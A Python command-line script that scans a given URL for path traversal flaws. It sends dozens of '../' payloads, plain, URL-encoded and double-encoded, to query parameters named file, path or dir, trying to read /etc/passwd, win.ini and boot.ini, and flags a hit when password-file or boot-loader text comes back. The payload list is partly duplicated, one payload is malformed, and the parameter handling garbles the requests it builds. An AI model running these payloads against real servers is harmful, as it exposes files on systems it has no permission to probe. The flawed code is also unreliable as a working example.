import requests
import urllib.parse
import sys
from colorama import Fore, Style

def check_path_traversal(url):
    parsed_url = urllib.parse.urlparse(url)
    entry_points = [param for param in parsed_url.query.split('&') if param.startswith('file') or param.startswith('path') or param.startswith('dir')]

    if not entry_points:
        print(Fore.RED + "No potential entry points found in the URL." + Style.RESET_ALL)
        return

    payloads = [
        '../', '..\\', './', '/../', '..\\..', '.././', '/./../', '..\\../',
        '....//', '....\\', '....//..//', '....\\..\\', '....//..', '....\\..',
        '....//etc/passwd', '....\\etc\\passwd',
        '....//windows/win.ini', '....\\windows\\win.ini',
        '....//boot.ini', '....\\boot.ini',
        '../../../etc/passwd', '../../../../../etc/passwd',

        '%2e%2e%2f', '%2e%2e%5c',  
        '%2e%2e%2f%2e%2e%2f', '%2e%2e%5c%2e%2e%5c',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f', '%2e%2e%5c%2e%2e%5c%2e%2e%5c',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f', '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c',
        '%2e%2e%2fetc%2fpasswd', '%2e%2e%5cetc%5cpasswd',
        '%2e%2e%2fwindows%2fwin.ini', '%2e%2e%5cwindows%5cwin.ini',
        '%2e%2e%2fboot.ini', '%2e%2e%5cboot.ini',
        '%2e%2e%2f..%2f..%2fetc%2fpasswd', '%2e%2e%5c..%5c..%5cetc%5cpasswd',
        '%2e%2e%2f..%2f..%2fwindows%2fwin.ini', '%2e%2e%5c..%5c..%5cwindows%5cwin.ini',
        '%2e%2e%2f..%2f..%2fboot.ini', '%2e%2e%5c..%5c..%5cboot.ini','..%2f..%2f..%2fetc%2fpasswd',

        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f', 
        '%252e%252e%252f',  
        '%252e%252e%255c',  
        '%252e%252e%252fetc%252fpasswd',  
        '%252e%252e%255cetc%255cpasswd',
        '%252e%252e%252fwindows%252fwin.ini',
        '%252e%252e%255cwindows%255cwin.ini',
        '%252e%252e%252fboot.ini',
        '%252e%252e%255cboot.ini',
        '%252e%252e%252f..%252f..%252fetc%252fpasswd',
        '%252e%252e%255c..%255c..%255cetc%255cpasswd',
        '%252e%252e%252f..%252f..%252fwindows%252fwin.ini',
        '%252e%252e%255c..%255c..%255cwindows%255`%255cwin.ini',
        '%252e%252e%252f..%252f..%252fboot.ini',
        '%252e%252e%255c..%255c..%255cboot.ini',

        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f', 
        '%252e%252e%252f', 
        '%252e%252e%255c',  
        '%252e%252e%252fetc%252fpasswd',  
        '%252e%252e%255cetc%255cpasswd',
        '%252e%252e%252fwindows%252fwin.ini',
        '%252e%252e%255cwindows%255cwin.ini',
        '%252e%252e%252fboot.ini',
        '%252e%252e%255cboot.ini',
        '%252e%252e%252f..%252f..%252fetc%252fpasswd',
        '%252e%252e%255c..%255c..%255cetc%255cpasswd',
        '%252e%252e%252f..%252f..%252fwindows%252fwin.ini',
        '%252e%252e%255c..%255c..%255cwindows%255cwin.ini',
        '%252e%252e%252f..%252f..%252fboot.ini',
        '%252e%252e%255c..%255c..%255cboot.ini',
    ]

    found_vulns = []

    for entry_point in entry_points:
        for payload in payloads:
            request_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{entry_point}={urllib.parse.quote(payload)}"
            print(f"Testing URL: {request_url}")  
            try:
                response = requests.get(request_url)
                if "root:x:" in response.text or "boot loader" in response.text:
                    print(Fore.GREEN + f"Vulnerability found with payload: {payload}" + Style.RESET_ALL)
                    found_vulns.append(payload)
                else:
                    print(Fore.RED + f"No vulnerability found with payload: {payload}" + Style.RESET_ALL)
            except requests.RequestException as e:
                print(Fore.RED + f"Request failed: {e}" + Style.RESET_ALL)

    print(Fore.YELLOW + "\nSummary:" + Style.RESET_ALL)
    print(Fore.GREEN + f"Total vulnerabilities found: {len(found_vulns)}" + Style.RESET_ALL)
    if found_vulns:
        print(Fore.GREEN + "Payloads that worked:" + Style.RESET_ALL)
        for vuln in found_vulns:
            print(Fore.GREEN + vuln + Style.RESET_ALL)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Fore.RED + "Usage: python Path_Traversal_Vulnerability_Checker.py <url>" + Style.RESET_ALL)
        sys.exit(1)

    url = sys.argv[1]
    check_path_traversal(url)